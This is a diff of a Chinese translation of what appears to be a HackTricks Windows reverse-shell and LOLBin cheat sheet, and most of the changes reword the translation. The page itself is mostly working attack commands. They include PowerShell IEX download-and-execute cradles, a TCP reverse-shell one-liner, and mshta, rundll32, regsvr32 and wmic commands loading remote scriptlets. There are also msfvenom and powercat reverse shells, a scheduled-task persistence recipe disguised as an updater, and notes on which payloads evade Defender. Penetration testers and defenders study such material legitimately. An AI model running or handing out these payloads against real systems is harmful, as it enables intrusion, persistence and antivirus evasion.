@@ -4,10 +4,10 @@
 
 ## Lolbas
 
-[lolbas-project.github.io](https://lolbas-project.github.io/) 面向 Windows，正如 [https://gtfobins.github.io/](https://gtfobins.github.io/) 面向 Linux 一样。<sup>[[13]](#references)[[14]](#references)</sup>
-Windows 使用访问令牌和权限来保护进程，Windows 11 还包含一个可选的 `sudo` 命令。<sup>[[11]](#references)[[12]](#references)</sup> 了解某些**二进制文件**如何被（滥）用来执行**任意代码**等意料之外的操作很有用。<sup>[[13]](#references)</sup>
+[lolbas-project.github.io](https://lolbas-project.github.io/) 面向 Windows，就像 [https://gtfobins.github.io/](https://gtfobins.github.io/) 面向 Linux 一样。<sup>[[13]](#references)[[14]](#references)</sup>
+Windows 使用访问令牌和权限来保障进程安全，Windows 11 还包含一个可选的 `sudo` 命令。<sup>[[11]](#references)[[12]](#references)</sup> 了解某些 **binaries** 如何被（滥）用于执行意料之外的操作（例如**执行任意代码**）很有用。<sup>[[13]](#references)</sup>
 
-下面收集的基础 Windows reverse-shell payload 也记录在 HighOn.Coffee 和 PayloadsAllTheThings 的备忘单中；请根据目标调整路径和已安装的解释器。<sup>[[1]](#references)[[4]](#references)</sup>
+下方收集的 Windows 基础 reverse-shell payloads 也记录在 HighOn.Coffee 和 PayloadsAllTheThings 的速查表中；请根据目标调整路径和已安装的解释器。<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## NC
 
@@ -35,7 +35,7 @@ ncat -l <PORT eg.443> --ssl
 
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) 是一款便携且安全的 Netcat 替代品**。它可在类 Unix 系统和 Win32 上运行。sbd 支持强加密、程序执行、自定义源端口和持续重新连接等功能，为 TCP/IP 通信提供了多用途解决方案。对于 Windows 用户，可以使用 Kali Linux 发行版中的 sbd.exe 版本，作为 Netcat 的可靠替代品。<sup>[[15]](#references)</sup>
+**[sbd](https://www.kali.org/tools/sbd/) 是一种便携且安全的 Netcat 替代品**。它可在类 Unix 系统和 Win32 上运行。凭借强加密、程序执行、自定义源端口和持续重新连接等功能，sbd 为 TCP/IP 通信提供了多用途的解决方案。对于 Windows 用户，可以使用 Kali Linux 发行版中的 sbd.exe 版本，作为 Netcat 的可靠替代品。<sup>[[15]](#references)</sup>
 
 ```bash
 # Victims machine
@@ -105,15 +105,15 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 
-发起网络调用的进程：**powershell.exe**\
-写入磁盘的 Payload：**没有**（_至少我用 procmon 没找到任何写入记录！_）。<sup>[[5]](#references)</sup>
+执行网络调用的进程：**powershell.exe**\
+Payload 写入磁盘：**否**（_至少我用 procmon 没找到任何写入记录！_）。<sup>[[5]](#references)</sup>
 
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 
-执行网络调用的进程：**svchost.exe**\
-写入磁盘的 Payload：**WebDAV client local cache**。<sup>[[5]](#references)</sup>
+发起网络调用的进程：**svchost.exe**\
+Payload 写入磁盘的位置：**WebDAV 客户端本地缓存**。<sup>[[5]](#references)</sup>
 
 **单行命令：**
 
@@ -125,7 +125,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 ## Mshta
 
-- [参见此处](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [点击此处](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
@@ -149,7 +149,7 @@ mshta \\webdavserver\folder\payload.hta
 
 #### hta 示例
 
-[**从这里**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f).<sup>[[7]](#references)</sup>
+[**点击这里**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f).<sup>[[7]](#references)</sup>
 
 ```xml
 <html>
@@ -168,7 +168,7 @@ mshta \\webdavserver\folder\payload.hta
 
 #### **mshta - sct**
 
-[**点击这里**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17).<sup>[[8]](#references)</sup>
+[**从这里**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17).<sup>[[8]](#references)</sup>
 
 ```xml
 <?XML version="1.0"?>
@@ -199,13 +199,13 @@ msf exploit(windows/misc/hta_server) > exploit
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
 
-**被 Defender 检测到**
+**被 Defender 检测**
 
 ## **Rundll32**
 
-[**DLL Hello World 示例**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
 
-- [来源](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [来自此处](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
@@ -219,7 +219,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
 
 **Rundll32 - sct**
 
-复用 [mshta - sct](#mshta-sct) 部分中展示的 scriptlet；其开头的注释包含对应的 `rundll32.exe` 启动命令。<sup>[[8]](#references)</sup>
+复用 [mshta - sct](#mshta-sct) 部分中展示的脚本小程序；其开头的注释包含相应的 `rundll32.exe` 启动器。<sup>[[8]](#references)</sup>
 
 #### **Rundll32 - Metasploit**
 
@@ -242,7 +242,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 
 ## Regsvr32
 
-- [来源](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [参见此处](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
@@ -252,14 +252,14 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 
-**由 defender 检测**
+**被 defender 检测到**
 
 #### Regsvr32 – 使用 /i 参数调用任意 DLL 导出函数（门控与持久化）
 
-除了加载远程 scriptlet（`scrobj.dll`）外，`regsvr32.exe` 还会加载本地 DLL 并调用其 `DllRegisterServer`/`DllUnregisterServer` 导出函数。自定义加载器经常滥用这一点来执行任意代码，同时伪装成已签名的 LOLBin。野外观察到的两种操作手法：<sup>[[6]](#references)</sup>
+除了加载远程 scriptlet（`scrobj.dll`）外，`regsvr32.exe` 还会加载本地 DLL 并调用其 `DllRegisterServer`/`DllUnregisterServer` 导出函数。自定义加载器经常滥用这一点，在伪装成已签名 LOLBin 的同时执行任意代码。实际观察到的两种 tradecraft 手法：<sup>[[6]](#references)</sup>
 
-- 门控参数：除非通过 `/i:<arg>` 传入特定开关，否则 DLL 会退出，例如使用 `/i:--type=renderer` 来模仿 Chromium renderer 子进程。这可以减少意外执行，并阻碍沙箱分析。
-- 持久化：安排 `regsvr32` 以静默模式和高权限运行 DLL，并传入所需的 `/i` 参数，将其伪装成更新程序任务：
+- 门控参数：DLL 除非通过 `/i:<arg>` 传入特定开关，否则会退出，例如使用 `/i:--type=renderer` 来模仿 Chromium renderer 子进程。这可以减少意外执行，并增加沙箱分析的难度。
+- 持久化：将 `regsvr32` 设为计划任务，以静默模式和高权限运行 DLL，并传入所需的 `/i` 参数，伪装成更新程序任务：
   ```powershell
   Register-ScheduledTask \
     -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -270,13 +270,13 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
     -RunLevel Highest
   ```
 
-另请参阅：ClickFix 剪贴板到 PowerShell 变体，它会暂存 JS loader，之后通过 `regsvr32` 实现持久化。<sup>[[6]](#references)</sup>
+另请参阅：ClickFix 剪贴板到 PowerShell 变体，该变体会暂存 JS loader，随后使用 `regsvr32` 实现持久化。<sup>[[6]](#references)</sup>
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
 
 
-[**从这里开始**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1).<sup>[[9]](#references)</sup>
+[**点击此处**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)。<sup>[[9]](#references)</sup>
 
 ```html
 <?XML version="1.0"?>
@@ -338,7 +338,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
 
-**被 Defender 检测到**
+**被 Defender 检测**
 
 ## PS-Bat
 
@@ -347,7 +347,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```
 
 执行网络调用的进程：**svchost.exe**\
-写入磁盘的 Payload：**WebDAV 客户端本地缓存**。<sup>[[5]](#references)</sup>
+写入磁盘的 Payload：**WebDAV client local cache**.<sup>[[5]](#references)</sup>
 
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
@@ -379,7 +379,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-- [来源](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [参见此处](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
@@ -401,17 +401,17 @@ wmic os get /format:"https://webserver/payload.xsl"
 
 **未检测到**
 
-**使用 stager wmic 可以非常轻松地下载并执行 Koadic zombie。**<sup>[[3]](#references)</sup>
+**使用 stager wmic，可以非常轻松地下载并执行 Koadic zombie。**<sup>[[3]](#references)</sup>
 
 ## Msbuild
 
-- [点击此处](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 
-该项目将 MSBuildShell 介绍为一种 PowerShell 宿主，可绕过应用程序白名单和 `powershell.exe` 限制，并提供类似 PowerShell 的 shell。<sup>[[16]](#references)</sup>\
+该项目介绍了 MSBuildShell，它是一个 PowerShell 主机，可绕过应用程序白名单和 `powershell.exe` 限制，并提供类似 PowerShell 的 shell。<sup>[[16]](#references)</sup>\
 只需下载并执行此文件：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)。<sup>[[16]](#references)</sup>
 
 ```
@@ -419,6 +419,8 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
 
 **未检测到**
+
+恶意 C# 项目在 Visual Studio 中打开时，也可以运行 [MSBuild 设计时目标](../../windows-hardening/visual-studio-project-msbuild-execution.md)，无需任何人显式调用 `MSBuild.exe` 或构建项目。<sup>[[28]](#references)</sup>
 
 ## **CSC**
 
@@ -428,7 +430,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
 
-你可以从这里下载一个基础的 C# reverse shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+你可以从这里下载一个基本的 C# reverse shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **未被检测到**
 
@@ -462,19 +464,19 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-在 **Shells** 文件夹中，有很多不同的 Shell。要下载并执行 Invoke-_PowerShellTcp.ps1_，请复制该脚本，并在文件末尾添加：<sup>[[19]](#references)</sup>
+在 **Shells** 文件夹中，有许多不同的 shells。要下载并执行 Invoke-_PowerShellTcp.ps1_，请复制该脚本，并将以下内容附加到文件末尾：<sup>[[19]](#references)</sup>
 
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
 
-在 web server 上提供该脚本，并在受害者端执行它：<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
+在 Web 服务器上提供该脚本，并在受害者端执行：<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
 
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 
-Defender 尚未将其检测为恶意代码（截至 2019 年 3 月 4 日）。
+Defender 目前还不会将其检测为恶意代码（截至 2019 年 3 月 4 日）。
 
 **TODO: 检查其他 nishang shells**
 
@@ -482,17 +484,17 @@ Defender 尚未将其检测为恶意代码（截至 2019 年 3 月 4 日）。
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-下载、启动 Web 服务器、启动 listener，然后在受害者端执行：<sup>[[22]](#references)</sup>
+下载、启动 Web 服务器、启动 listener，然后在受害端执行它：<sup>[[22]](#references)</sup>
 
 ```
  powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 
-Defender 目前不会将其检测为恶意代码（截至 2019 年 3 月 4 日）。
+Defender 尚未将其检测为恶意代码（截至 2019 年 3 月 4 日）。
 
 **powercat 提供的其他选项：**
 
-Bind shells、Reverse shell（TCP、UDP、DNS）、Port redirect、upload/download、Generate payloads、Serve files...<sup>[[22]](#references)</sup>
+Bind shells、Reverse shell（TCP、UDP、DNS）、端口转发、上传/下载、生成 payload、提供文件...<sup>[[22]](#references)</sup>
 
 ```
 Serve a cmd Shell:
@@ -515,31 +517,31 @@ Start A Persistent Server That Serves a File:
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-创建一个 PowerShell 启动器，将其保存到文件中，然后下载并执行。<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
+创建一个 PowerShell launcher，将其保存到文件中，然后下载并执行它。<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 
-**被检测为恶意代码**
+**检测为恶意代码**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-使用 unicorn 创建一个 PowerShell 版本的 metasploit 后门。<sup>[[24]](#references)</sup>
+使用 unicorn 创建 Metasploit 后门的 powershell 版本。<sup>[[24]](#references)</sup>
 
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 
-使用创建的资源启动 msfconsole：<sup>[[24]](#references)</sup>
+使用创建的 resource 启动 msfconsole：<sup>[[24]](#references)</sup>
 
 ```
 msfconsole -r unicorn.rc
 ```
 
-启动一个提供 _powershell_attack.txt_ 文件的 web server，并在受害者上执行：<sup>[[24]](#references)</sup>
+启动一个用于提供 _powershell_attack.txt_ 文件的 web server，并在受害者机器上执行：<sup>[[24]](#references)</sup>
 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
@@ -549,9 +551,9 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## 更多
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) 预加载了一些 offensive PS modules 的 PS 控制台（已加密）\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) 预加载了一些 offensive PS 模块的 PS 控制台（已加密）\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-[WinPWN](https://github.com/SecureThisShit/WinPwn) 带有一些 offensive PS modules 和代理检测功能（IEX）的 PS 控制台。<sup>[[25]](#references)</sup>
+[WinPWN](https://github.com/SecureThisShit/WinPwn) 预加载了一些 offensive PS 模块并具有代理检测功能的 PS 控制台（IEX）。<sup>[[25]](#references)</sup>
 
 ## References
 
@@ -560,7 +562,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 - [3] [Koadic – COM 命令与控制框架](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 - [4] [Reverse Shell 速查表 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [5] [用于下载远程 Payload 并执行任意代码的 Windows 单行命令](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-- [6] [Check Point Research – 透过 Pure Curtain：从 RAT 到 Builder 再到 Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [6] [Check Point Research – 纯净幕布之下：从 RAT 到构建器再到编码者](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 - [7] [calc.hta – HTA 反向执行示例（Arno0x gist）](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 - [8] [scriptlet.sct – mshta/rundll32 scriptlet 示例（Arno0x gist）](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 - [9] [regsvr32.sct – Regsvr32 scriptlet 示例（Arno0x gist）](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
@@ -582,4 +584,5 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 - [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
 - [26] [Empire Wiki](https://bc-security.gitbook.io/empire-wiki/)
 - [27] [multi_generate_agent | Empire Wiki](https://bc-security.gitbook.io/empire-wiki/stagers/multi_generate_agent)
+- [28] [Unit 42 - Blinder Tunnel Campaign 瞄准伊拉克基础设施](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
 {{#include ../../banners/hacktricks-training.md}}
